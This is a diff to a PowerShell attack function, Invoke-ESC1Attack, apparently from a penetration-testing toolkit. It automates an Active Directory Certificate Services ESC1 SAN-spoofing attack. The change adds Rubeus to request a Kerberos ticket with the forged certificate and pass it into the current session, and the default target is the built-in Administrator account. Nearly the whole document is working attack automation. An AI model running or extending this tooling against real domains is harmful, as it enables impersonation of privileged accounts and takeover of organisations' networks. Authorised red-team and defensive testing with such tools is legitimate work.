@@ -6,8 +6,11 @@ function Invoke-ESC1Attack {
         .DESCRIPTION
         This function executes an ESC1 (SAN Spoofing) attack against a vulnerable certificate template.
         It uses Certify.exe to request a certificate from the specified template while spoofing the 
-        Subject Alternative Name (SAN) to impersonate any specified security principal. If no target
-        principal is specified, it defaults to the local Administrator account (RID 500).
+        Subject Alternative Name (SAN) to impersonate any specified security principal. After successful
+        certificate issuance, it automatically uses Rubeus.exe to request a TGT with the certificate
+        and applies it to the current session, completing the full attack workflow.
+        
+        If no target principal is specified, it defaults to the local Administrator account (RID 500).
         
         ESC1 attacks exploit templates that:
         1. Allow SAN specification (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag set)
@@ -27,6 +30,10 @@ function Invoke-ESC1Attack {
         .PARAMETER CertifyPath
         Path to Certify.exe executable. If not specified, assumes Certify.exe is in the Binaries
         folder (.\Binaries\Certify.exe).
+
+        .PARAMETER RubeusPath
+        Path to Rubeus.exe executable. If not specified, assumes Rubeus.exe is in the Binaries
+        folder (.\Binaries\Rubeus.exe). Used for automatic TGT request after certificate issuance.
 
         .PARAMETER OutputPath
         Directory where certificate files (.pfx) will be saved. Defaults to current directory.
@@ -73,10 +80,11 @@ function Invoke-ESC1Attack {
         
         Requires:
         - Certify.exe (https://github.com/GhostPack/Certify/releases) placed in .\Binaries\ folder
+        - Rubeus.exe (https://github.com/GhostPack/Rubeus/releases) placed in .\Binaries\ folder
         - Network access to Certificate Authority
         - Appropriate permissions to enroll certificates
         
-        Download Certify.exe and place it in the Binaries folder before using this function.
+        Download Certify.exe and Rubeus.exe and place them in the Binaries folder before using this function.
 
         .LINK
         https://posts.specterops.io/certified-pre-owned-d95910965cd2
@@ -92,6 +100,9 @@ function Invoke-ESC1Attack {
         
         [Parameter()]
         [string]$CertifyPath = ".\Binaries\Certify.exe",
+        
+        [Parameter()]
+        [string]$RubeusPath = ".\Binaries\Rubeus.exe",
         
         [Parameter()]
         [string]$OutputPath = ".",
@@ -130,6 +141,34 @@ function Invoke-ESC1Attack {
                 Write-Verbose "Found Certify.exe at alternative location: $CertifyPath"
             } else {
                 throw "Certify.exe not found in any expected location. Please download Certify.exe from https://github.com/GhostPack/Certify/releases and place it in the Binaries folder."
+            }
+        }
+        
+        # Validate Rubeus.exe exists - check multiple possible locations
+        if (-not (Test-Path -Path $RubeusPath)) {
+            Write-Warning "Rubeus.exe not found at specified path: $RubeusPath"
+            
+            # Try common alternative locations
+            $rubeusAlternativePaths = @(
+                ".\Binaries\Rubeus.exe",
+                ".\Tools\Rubeus.exe", 
+                ".\Rubeus.exe",
+                "C:\Tools\Rubeus.exe"
+            )
+            
+            $foundRubeusPath = $null
+            foreach ($altPath in $rubeusAlternativePaths) {
+                if (Test-Path -Path $altPath) {
+                    $foundRubeusPath = $altPath
+                    break
+                }
+            }
+            
+            if ($foundRubeusPath) {
+                $RubeusPath = $foundRubeusPath
+                Write-Verbose "Found Rubeus.exe at alternative location: $RubeusPath"
+            } else {
+                throw "Rubeus.exe not found in any expected location. Please download Rubeus.exe from https://github.com/GhostPack/Rubeus/releases and place it in the Binaries folder."
             }
         }
         
@@ -377,6 +416,43 @@ function Invoke-ESC1Attack {
                         $certificate = $null
                     }
                     
+                    # Use Rubeus to request TGT with the certificate
+                    $rubeusOutput = $null
+                    $rubeusExitCode = $null
+                    if ($certificate) {
+                        try {
+                            Write-Host "[i] Using Rubeus to request TGT with certificate..." -ForegroundColor Cyan
+                            
+                            # Build Rubeus command arguments
+                            $rubeusArgs = @(
+                                "asktgt"
+                                "/user:$targetName"
+                                "/certificate:$certificate"
+                                "/ptt"
+                            )
+                            
+                            Write-Verbose "Rubeus command: $RubeusPath $($rubeusArgs -join ' ')"
+                            
+                            # Execute Rubeus
+                            $rubeusOutput = & $RubeusPath $rubeusArgs 2>&1
+                            $rubeusExitCode = $LASTEXITCODE
+                            
+                            Write-Verbose "Rubeus.exe exit code: $rubeusExitCode"
+                            Write-Verbose "Rubeus.exe output: $rubeusOutput"
+                            
+                            if ($rubeusExitCode -eq 0) {
+                                Write-Host "[+] TGT successfully requested and applied!" -ForegroundColor Green
+                            } else {
+                                Write-Warning "Rubeus failed with exit code $rubeusExitCode"
+                            }
+                            
+                        } catch {
+                            Write-Warning "Failed to execute Rubeus: $($_.Exception.Message)"
+                        }
+                    } else {
+                        Write-Warning "Skipping Rubeus TGT request - no certificate available"
+                    }
+                    
                     return [PSCustomObject]@{
                         Success = $true
                         TemplateName = $templateName
@@ -385,6 +461,8 @@ function Invoke-ESC1Attack {
                         TargetSID = $targetSID
                         CertificateAuthority = $CertificateAuthority
                         CertifyOutput = $certifyOutput -join "`n"
+                        RubeusOutput = if ($rubeusOutput) { $rubeusOutput -join "`n" } else { $null }
+                        RubeusExitCode = $rubeusExitCode
                         ExitCode = $exitCode
                         Error = $null
                     }
@@ -400,6 +478,8 @@ function Invoke-ESC1Attack {
                     Error = $_.Exception.Message
                     CertificatePath = $certFilePath
                     CertifyOutput = if ($certifyOutput) { $certifyOutput -join "`n" } else { $null }
+                    RubeusOutput = if ($rubeusOutput) { $rubeusOutput -join "`n" } else { $null }
+                    RubeusExitCode = $rubeusExitCode
                     ExitCode = if ($exitCode) { $exitCode } else { $null }
                 }
             }
@@ -409,6 +489,8 @@ function Invoke-ESC1Attack {
             Write-Host "What if: Would request certificate with target principal SAN: $targetName ($targetSID)" -ForegroundColor Yellow
             Write-Host "What if: Would save certificate to: $certFilePath" -ForegroundColor Yellow
             Write-Host "What if: Certify command: $CertifyPath $($certifyArgs -join ' ')" -ForegroundColor Yellow
+            Write-Host "What if: Would use Rubeus to request TGT with certificate" -ForegroundColor Yellow
+            Write-Host "What if: Rubeus command: $RubeusPath asktgt /user:$targetName /certificate:<cert> /ptt" -ForegroundColor Yellow
             
             return [PSCustomObject]@{
                 Success = $true
@@ -418,6 +500,8 @@ function Invoke-ESC1Attack {
                 TargetSID = $targetSID
                 CertificateAuthority = $CertificateAuthority
                 CertifyOutput = "WhatIf mode - attack not executed"
+                RubeusOutput = "WhatIf mode - Rubeus not executed"
+                RubeusExitCode = 0
                 ExitCode = 0
                 Error = $null
             }
